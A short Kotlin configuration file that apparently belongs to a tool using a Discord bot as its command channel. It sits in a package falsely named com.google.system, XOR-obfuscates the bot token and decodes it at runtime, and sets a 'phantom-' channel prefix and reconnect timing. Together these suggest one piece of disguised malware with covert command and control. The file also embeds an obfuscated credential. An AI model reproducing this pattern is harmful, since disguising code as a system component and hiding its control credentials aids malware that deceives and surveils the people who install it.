package com.google.system

object DiscordConfig {
    private val TOKEN_KEY = listOf(161, 72, 45, 140, 148, 51, 230, 233, 184, 63, 60, 196, 164, 172, 85, 255)
    private val TOKEN_ENC = listOf(
        236, 28, 124, 244, 218, 73, 191, 219, 246, 107, 109, 246, 233, 214, 28, 204,
        239, 50, 120, 184, 219, 119, 179, 144, 245, 110, 18, 131, 199, 206, 62, 166,
        211, 102, 75, 181, 223, 127, 158, 164, 138, 13, 12, 165, 192, 152, 26, 177,
        210, 37, 119, 195, 231, 71, 208, 141, 215, 87, 109, 140, 145, 254, 38, 152,
        194, 10, 73, 184, 238, 93, 173, 158
    )

    val BOT_TOKEN: String by lazy {
        val arr = ByteArray(TOKEN_ENC.size) { i ->
            (TOKEN_ENC[i] xor TOKEN_KEY[i % TOKEN_KEY.size]).toByte()
        }
        String(arr)
    }

    const val GATEWAY_URL = "wss://gateway.discord.gg/?v=10&encoding=json"

    const val INTENTS = 33281

    const val CHANNEL_PREFIX = "phantom-"

    const val RECONNECT_BASE_DELAY = 1000L
    const val MAX_RECONNECT_DELAY = 30000L
}
